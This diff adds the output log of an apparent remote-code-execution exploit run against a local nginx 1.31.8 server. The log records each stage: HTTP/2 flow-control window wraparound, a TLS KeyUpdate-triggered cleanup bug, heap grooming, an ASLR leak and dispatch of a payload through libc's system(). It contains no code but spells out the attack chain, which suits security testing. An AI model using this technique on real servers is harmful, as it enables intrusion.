@@ -1,0 +1,50 @@
+18:33:33 INFO starting exploit: target=https://127.0.0.1:19443 profile=golden-nginx-1.31.8-debian13-amd64 candidate_profiles=1 command_bytes=41
+18:33:33 INFO TLS connected: version=TLSv1.3 cipher=TLS_AES_256_GCM_SHA384 ALPN=h2
+18:33:33 INFO starting in-band HTTP/2 target profiling and window setup
+18:33:34 INFO runtime HTTP profile: resource=896 initial=2 probes + 71 full + 127 ranged bytes max_concurrent=128 candidates=golden-nginx-1.31.8-debian13-amd64
+18:33:34 INFO initial HTTP/2 connection window exhausted
+18:33:34 INFO triggering cleanup accounting bug: bootstrap_bytes=7340032 TLS_KeyUpdates=262144
+18:34:04 INFO vulnerable cleanup observed: target streams reset after public-byte release
+18:34:05 INFO final TLS key synchronized; bulk window schedule can begin
+18:34:05 INFO sending fixed flood-budget carrier: 15.00 GiB plaintext
+18:34:11 INFO fixed carrier progress: 7% (1.00 GiB sent)
+18:34:17 INFO fixed carrier progress: 13% (2.00 GiB sent)
+18:34:23 INFO fixed carrier progress: 20% (3.00 GiB sent)
+18:34:29 INFO fixed carrier progress: 27% (4.00 GiB sent)
+18:34:34 INFO fixed carrier progress: 33% (5.00 GiB sent)
+18:34:40 INFO fixed carrier progress: 40% (6.00 GiB sent)
+18:34:46 INFO fixed carrier progress: 47% (7.00 GiB sent)
+18:34:52 INFO fixed carrier progress: 53% (8.00 GiB sent)
+18:34:58 INFO fixed carrier progress: 60% (9.00 GiB sent)
+18:35:03 INFO fixed carrier progress: 67% (10.00 GiB sent)
+18:35:09 INFO fixed carrier progress: 73% (11.00 GiB sent)
+18:35:15 INFO fixed carrier progress: 80% (12.00 GiB sent)
+18:35:21 INFO fixed carrier progress: 87% (13.00 GiB sent)
+18:35:27 INFO fixed carrier progress: 93% (14.00 GiB sent)
+18:35:32 INFO fixed carrier progress: 100% (15.00 GiB sent)
+18:35:33 INFO fixed carrier complete: 15.00 GiB in 87.11s
+18:35:33 INFO replaying 8589934593 legal WINDOW_UPDATE frames across 96 owners
+18:35:52 INFO WINDOW_UPDATE replay: 9% (9/96 tranches)
+18:36:11 INFO WINDOW_UPDATE replay: 19% (18/96 tranches)
+18:36:30 INFO WINDOW_UPDATE replay: 28% (27/96 tranches)
+18:36:50 INFO WINDOW_UPDATE replay: 38% (36/96 tranches)
+18:37:10 INFO WINDOW_UPDATE replay: 47% (45/96 tranches)
+18:37:29 INFO WINDOW_UPDATE replay: 56% (54/96 tranches)
+18:37:49 INFO WINDOW_UPDATE replay: 66% (63/96 tranches)
+18:38:09 INFO WINDOW_UPDATE replay: 75% (72/96 tranches)
+18:38:28 INFO WINDOW_UPDATE replay: 84% (81/96 tranches)
+18:38:48 INFO WINDOW_UPDATE replay: 94% (90/96 tranches)
+18:39:01 INFO WINDOW_UPDATE replay: 100% (96/96 tranches)
+18:39:02 INFO wrapped flow-control distance reached; tailored increment=0x7fffc0d5
+18:39:02 INFO opening 16 auxiliary allocator connections
+18:39:05 INFO auxiliary connections ready: 16
+18:39:05 INFO preparing profiled heap layout and reclaim candidates
+18:39:09 INFO profiled B/C heap layout is ready
+18:39:10 INFO heap source and overwrite target allocated; triggering copy
+18:39:12 INFO captured 14393-byte memory disclosure; resolving ASLR
+18:39:12 INFO ASLR resolved: profile=golden-nginx-1.31.8-debian13-amd64 H=0x555abcdf6ad0 nginx=0x555abb6a4840 libc=0x7fa086c1b000
+18:39:12 INFO B-free barrier observed; releasing 16 reclaim candidates
+18:39:12 INFO reclaim completed; dispatching C cleanup callback
+18:39:17 INFO address-directed libc symbols resolved in-band: libc=0x7fa086c1b000 system=0x7fa086c6e090
+18:39:17 INFO late target-owned execution record installed; releasing final response byte
+18:39:19 INFO payload dispatched in 346.12s: H=0x555abcdf6ad0 nginx=0x555abb6a4840 libc=0x7fa086c1b000 profile=golden-nginx-1.31.8-debian13-amd64 plaintext=119.02 GiB auxiliaries=16; use an external command oracle to confirm execution
